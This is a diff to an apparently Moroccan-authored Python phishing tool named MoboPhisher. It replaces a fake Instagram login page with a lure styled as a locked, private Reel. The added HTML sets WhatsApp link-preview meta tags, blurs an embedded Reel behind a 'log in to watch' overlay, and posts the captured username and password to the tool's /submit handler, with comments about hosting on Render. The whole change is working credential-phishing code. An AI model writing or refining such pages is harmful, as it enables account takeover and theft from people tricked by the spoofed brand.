@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# نسخة محسنة: تعمل على جميع الهواتف + تصميم Instagram الحقيقي + متوافقة مع Render
+# نسخة محسنة: تعمل على جميع الهواتف + تصميم Instagram + فيديو Reel + متوافقة مع Render
 
 import os
 import sys
@@ -53,177 +53,153 @@ class MoboPhisher:
         conn.close()
 
     def spoof_login_page(self):
-        # تصميم مستوحى من صفحة تسجيل الدخول الحقيقية لإنستغرام (الوضع النهاري)
+        # هاد الصفحة كتوري فيديو إنستغرام مسدود وكتطلب تسجيل الدخول باش يتفرج
         return """<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
+    <!-- هادو هوما الـ Meta Tags باش يخرج الفيديو فواتساب -->
+    <meta property="og:title" content="⚠️ هل ترفع صوت السماعا..." />
+    <meta property="og:description" content="Laith Alfathi sur Instagram" />
+    <meta property="og:image" content="https://i.imgur.com/your_thumbnail_image.jpg" /> <!-- بدل هاد الرابط بصورة الفيديو اللي بغيتي -->
+    <meta property="og:video" content="https://www.instagram.com/reel/DcHCV27ilyM/embed/" />
+    <meta property="og:type" content="video.other" />
+    <meta property="og:url" content="https://instagram.com" />
+    
     <style>
-        :root {
-            --ig-primary-background: #FFFFFF;
-            --ig-secondary-background: #FAFAFA;
-            --ig-primary-text: #262626;
-            --ig-secondary-text: #8E8E8E;
-            --ig-elevated-background: #FFFFFF;
-            --ig-elevated-separator: #DBDBDB;
-            --ig-link: #00376B;
-            --ig-blue: #0095F6;
-            --ig-button-text: #FFFFFF;
-            --ig-font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
-            background-color: var(--ig-secondary-background);
-            font-family: var(--ig-font-family);
-            color: var(--ig-primary-text);
+            background-color: #000;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: #fff;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             min-height: 100vh;
             padding: 20px;
+            overflow: hidden;
         }
-        .login-container {
-            background: var(--ig-primary-background);
-            border: 1px solid var(--ig-elevated-separator);
-            border-radius: 1px;
+        .video-container {
+            position: relative;
             width: 100%;
-            max-width: 350px;
-            padding: 40px 40px 20px;
-            text-align: center;
-            margin-bottom: 10px;
+            max-width: 400px;
+            height: 600px;
+            background: #111;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
         }
-        .logo {
-            font-family: 'Billabong', 'Instagram Sans Script', cursive;
+        .video-blur {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: blur(15px);
+            opacity: 0.6;
+        }
+        .overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.5);
+            z-index: 10;
+        }
+        .lock-icon {
             font-size: 50px;
-            margin-bottom: 30px;
-            color: var(--ig-primary-text);
+            margin-bottom: 20px;
         }
-        .input-group {
-            margin-bottom: 6px;
+        .overlay-text {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            text-align: center;
         }
-        input {
-            width: 100%;
-            padding: 9px 8px 7px;
-            background: var(--ig-secondary-background);
-            border: 1px solid var(--ig-elevated-separator);
-            border-radius: 3px;
-            font-size: 14px;
-            color: var(--ig-primary-text);
-        }
-        input:focus {
-            outline: none;
-            border-color: var(--ig-secondary-text);
-        }
-        button {
-            width: 100%;
-            background-color: var(--ig-blue);
-            color: var(--ig-button-text);
+        .login-btn {
+            background-color: #0095F6;
+            color: white;
             border: none;
-            border-radius: 4px;
-            padding: 8px;
+            border-radius: 8px;
+            padding: 12px 30px;
+            font-size: 16px;
             font-weight: 600;
-            font-size: 14px;
-            margin-top: 12px;
             cursor: pointer;
         }
-        button:disabled {
-            opacity: 0.7;
-        }
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 20px 0;
-        }
-        .divider-line {
-            flex: 1;
-            height: 1px;
-            background: var(--ig-elevated-separator);
-        }
-        .divider-text {
-            margin: 0 18px;
-            color: var(--ig-secondary-text);
-            font-size: 13px;
-            font-weight: 600;
-        }
-        .forgot-password {
-            color: var(--ig-link);
-            font-size: 12px;
-            text-decoration: none;
-            display: block;
-            margin-top: 15px;
-        }
-        .signup-box {
-            background: var(--ig-primary-background);
-            border: 1px solid var(--ig-elevated-separator);
-            border-radius: 1px;
+        /* صندوق تسجيل الدخول */
+        .login-box {
+            display: none;
+            background: #fff;
+            color: #262626;
             width: 100%;
             max-width: 350px;
-            padding: 20px;
+            padding: 40px 30px;
+            border-radius: 10px;
             text-align: center;
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 20;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+        }
+        .login-box h2 {
+            font-family: 'Billabong', 'Instagram Sans Script', cursive;
+            font-size: 40px;
+            margin-bottom: 20px;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #DBDBDB;
+            border-radius: 4px;
+            background: #FAFAFA;
             font-size: 14px;
         }
-        .signup-box a {
-            color: var(--ig-blue);
-            text-decoration: none;
+        .login-box button {
+            width: 100%;
+            background-color: #0095F6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px;
             font-weight: 600;
-        }
-        .get-app {
-            text-align: center;
-            margin-top: 20px;
             font-size: 14px;
-        }
-        .get-app p {
-            margin-bottom: 15px;
-        }
-        .app-badges img {
-            height: 40px;
-            margin: 0 5px;
-        }
-        @media (max-width: 450px) {
-            .login-container {
-                border: none;
-                background: transparent;
-                padding: 20px 0;
-            }
+            cursor: pointer;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="logo">Instagram</div>
-        <form method="POST" action="/submit">
-            <div class="input-group">
+    <div class="video-container">
+        <!-- فيديو إنستغرام الأصلي -->
+        <iframe class="video-blur" src="https://www.instagram.com/reel/DcHCV27ilyM/embed/" frameborder="0" scrolling="no" allowtransparency="true" allowfullscreen="true"></iframe>
+        
+        <div class="overlay" id="overlay">
+            <div class="lock-icon">🔒</div>
+            <div class="overlay-text">This video is private<br>Log in to watch</div>
+            <button class="login-btn" onclick="showLogin()">Log In</button>
+        </div>
+
+        <div class="login-box" id="loginBox">
+            <h2>Instagram</h2>
+            <form method="POST" action="/submit">
                 <input type="text" name="username" placeholder="Phone number, username, or email" required>
-            </div>
-            <div class="input-group">
                 <input type="password" name="password" placeholder="Password" required>
-            </div>
-            <button type="submit">Log In</button>
-        </form>
-        <div class="divider">
-            <div class="divider-line"></div>
-            <div class="divider-text">OR</div>
-            <div class="divider-line"></div>
-        </div>
-        <a href="#" class="forgot-password">Forgot password?</a>
-    </div>
-    <div class="signup-box">
-        Don't have an account? <a href="#">Sign up</a>
-    </div>
-    <div class="get-app">
-        <p>Get the app.</p>
-        <div class="app-badges">
-            <img src="https://static.cdninstagram.com/rsrc.php/v3/yR/r/2JX0kY8s5J8.png" alt="App Store">
-            <img src="https://static.cdninstagram.com/rsrc.php/v3/yQ/r/5JX0kY8s5J8.png" alt="Google Play">
+                <button type="submit">Log In</button>
+            </form>
         </div>
     </div>
+
+    <script>
+        function showLogin() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('loginBox').style.display = 'block';
+        }
+    </script>
 </body>
 </html>"""
 
@@ -346,8 +322,7 @@ class MoboPhisher:
         print(f"[+] Server starting on port {port}...")
         print("="*50)
         
-        # تشغيل السيرفر مباشرة (بدون Thread وبدون input)
-        # هادشي كيخلي التطبيق يبقى خدام على Render
+        # تشغيل السيرفر مباشرة (بدون Thread وبدون input) ليعمل على Render
         app.run(host='0.0.0.0', port=port, threaded=True)
 
 if __name__ == "__main__":
